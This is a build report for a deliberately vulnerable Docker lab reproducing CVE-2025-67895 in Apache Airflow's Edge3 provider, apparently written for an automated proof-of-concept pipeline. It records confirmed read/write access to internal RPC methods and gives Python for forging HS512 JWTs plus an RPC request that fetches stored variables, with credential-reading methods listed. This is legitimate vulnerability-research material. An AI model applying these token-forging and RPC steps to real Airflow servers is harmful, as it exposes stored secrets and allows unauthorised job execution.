# Lab Build Report: CVE-2025-67895

## Lab Architecture

**Architecture Type:** Multi-container (docker-compose)

The lab consists of two containers:

| Container | Role | Image | Network(s) |
|-----------|------|-------|-------------|
| `cve-2025-67895-db` | PostgreSQL 16 database backend | `postgres:16-bookworm` | `lab-net` |
| `cve-2025-67895-vulnerable` | Apache Airflow 2.11.1 webserver with vulnerable Edge3 provider 1.6.0 | Custom (based on `apache/airflow:2.11.1-python3.12`) | `lab-net` |

### Installed Software Versions

| Package | Version |
|---------|---------|
| Apache Airflow | 2.11.1 |
| apache-airflow-providers-edge3 | 1.6.0 (VULNERABLE) |
| Python | 3.12 |
| PostgreSQL | 16 |
| connexion | &lt;3.0 (Airflow 2.x dependency) |
| pydantic | ≥2.11.0 |

## Container Details

### PostgreSQL Database (`cve-2025-67895-db`)

- **Image:** `postgres:16-bookworm`
- **Credentials:** `airflow:airflow` (user:password), database: `airflow`
- **Port:** 5432 (internal only, not exposed to host)
- **Network:** `lab-net`
- **Healthcheck:** `pg_isready -U airflow`

### Airflow Webserver (`cve-2025-67895-vulnerable`)

- **Base Image:** `apache/airflow:2.11.1-python3.12`
- **Port:** 8080 (exposed to host)
- **Networks:** `lab-net`
- **Web UI credentials:** `admin:admin`

#### Critical Configuration

| Config Key | Value | Purpose |
|------------|-------|---------|
| `[edge] api_enabled` | `True` | **Enables the vulnerable Edge Worker API endpoints** |
| `[core] internal_api_secret_key` | `my-secret-key-for-testing` | JWT signing key for RPC API authentication |
| `AIRFLOW_ENABLE_AIP_44` | `true` | Enables AIP-44 internal API mode (required for BaseSerialization with pydantic models) |
| `[core] executor` | `LocalExecutor` | Standard executor (sufficient for webserver PoC) |
| `[database] sql_alchemy_conn` | `postgresql+psycopg2://airflow:airflow@cve-2025-67895-db:5432/airflow` | DB connection |

## Build Status

| Container | Status | Notes |
|-----------|--------|-------|
| `cve-2025-67895-db` | ✅ **Healthy** | PostgreSQL running, accepting connections |
| `cve-2025-67895-vulnerable` | ✅ **Healthy** | Airflow webserver running, all endpoints responding |

### Build Workarounds

1. **AIP-44 Feature Flag:** The `AIRFLOW_ENABLE_AIP_44=true` environment variable is required. Without it, the `BaseSerialization.deserialize()` call in `rpcapi_v2()` raises a `RuntimeError` when `use_pydantic_models=True`. This flag enables the Airflow internal API serialization mode that the Edge3 provider depends on.

2. **JWT Algorithm:** The Airflow `JWTSigner` uses **HS512** (not HS256). PoC scripts must use `algorithm='HS512'` when generating JWT tokens.

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Stop the lab
docker compose down

# Full reset (including database)
docker compose down -v

# View logs
docker compose logs vulnerable

# Check status
docker compose ps
```

## Accessing the Lab

### From the host

```bash
docker exec cve-2025-67895-vulnerable curl http://localhost:8080/edge_worker/v1/health
```

## Verification Results

### 1. Edge Worker Health Endpoint (No Auth)

```
GET /edge_worker/v1/health → 200 {"status": "healthy"}
```

### 2. JWT Authentication

- **Algorithm:** HS512
- **Secret Key:** `my-secret-key-for-testing` (from `[core] internal_api_secret_key`)
- **Audience:** `api`
- **Claims:** `{"method": "<rpc_method>", "aud": "api", "iat": <now>, "nbf": <now>, "exp": <now+60>}`

### 3. RPC API Method Invocation (73 methods exposed)

Successfully tested:
- `airflow.secrets.metastore.MetastoreBackend._fetch_variable` — **200 OK** (read Airflow variables)
- `airflow.models.variable.Variable._set` — **200 OK** (write Airflow variables)
- Read-back verification: Set variable `pwned_via_cve_2025_67895` to `"RCE_PROOF_OF_CONCEPT"`, then read it back successfully — proving both **read AND write access** to Airflow internals via the exposed RPC API.

### 4. Full Internal Method Map (73 methods)

All methods from `initialize_method_map()` are accessible, including:
- `airflow.api.common.trigger_dag.trigger_dag` — trigger arbitrary DAG runs
- `airflow.models.variable.Variable._set` / `._delete` / `._update` — CRUD on variables
- `airflow.secrets.metastore.MetastoreBackend._fetch_connection` — read connection credentials
- `airflow.secrets.metastore.MetastoreBackend._fetch_variable` — read variables (secrets)
- `airflow.models.taskinstance.TaskInstance._set_state` — manipulate task states
- `airflow.models.taskinstance.TaskInstance.save_to_db` — persist task instances
- `airflow.models.xcom.BaseXCom.set` / `.get_one` — read/write XCom data
- `airflow.jobs.job.Job._add_to_db` / `._kill` — job management
- ... and 60+ more internal methods

## Vulnerable Endpoints

All registered via the CSRF-exempt Flask Blueprint in `edge_executor_plugin.py`:

| Endpoint | Method | Auth | Handler |
|----------|--------|------|---------|
| `/edge_worker/v1/health` | GET | None | Health check |
| `/edge_worker/v1/rpcapi` | POST | JWT | `rpcapi_v2()` — **Full internal RPC API proxy** |
| `/edge_worker/v1/worker/{name}` | POST | JWT | `register_v2()` — Worker registration |
| `/edge_worker/v1/worker/{name}` | PATCH | JWT | `set_state_v2()` — Worker state |
| `/edge_worker/v1/jobs/fetch/{name}` | POST | JWT | `job_fetch_v2()` — Job fetch |
| `/edge_worker/v1/jobs/state/...` | PATCH | JWT | `job_state_v2()` — Job state |
| `/edge_worker/v1/logs/logfile_path/...` | GET | JWT | `logfile_path_v2()` — Log paths |
| `/edge_worker/v1/logs/push/...` | POST | JWT | `push_logs_v2()` — Log push |

## PoC Requirements

For the PoC agent, the following is needed:

1. **Target URL:** `http://<container_ip>:8080`
2. **JWT Secret:** `my-secret-key-for-testing`
3. **JWT Algorithm:** `HS512`
4. **Python packages needed:** `PyJWT`, `requests` (or stdlib `urllib`)
5. **Serialization:** Use `BaseSerialization.serialize(params, use_pydantic_models=True)` for proper parameter formatting, or manually construct `{"__var": {...}, "__type": "dict"}` format

### JWT Token Generation (for PoC)

```python
import jwt
import time

secret_key = "my-secret-key-for-testing"
now = int(time.time())
method = "airflow.secrets.metastore.MetastoreBackend._fetch_variable"

token = jwt.encode({
    "method": method,
    "aud": "api",
    "iat": now,
    "nbf": now,
    "exp": now + 60,
}, secret_key, algorithm="HS512")
```

### RPC Request Format

```json
{
    "jsonrpc": "2.0",
    "method": "airflow.secrets.metastore.MetastoreBackend._fetch_variable",
    "params": {"__var": {"key": "some_variable"}, "__type": "dict"}
}
```

## Known Issues

1. **Scheduler not running:** The Airflow scheduler is not started (not needed for the webserver PoC). The `/health` endpoint shows scheduler as "unhealthy" — this is expected and does not affect the vulnerability.

2. **JWT key length warning:** The secret key `my-secret-key-for-testing` is shorter than the recommended 64 bytes for HS512. This produces a `InsecureKeyLengthWarning` but does not prevent functionality. This is intentional for the lab — a real deployment would use a longer key.

## Lab Files

| File | Purpose |
|------|---------|
| `Dockerfile.vulnerable` | Builds vulnerable Airflow image |
| `docker-compose.yml` | Orchestrates DB + webserver |
| `airflow.cfg` | Airflow configuration with edge3 enabled |
| `entrypoint.sh` | Container entrypoint (DB wait, migrate, create user, start webserver) |
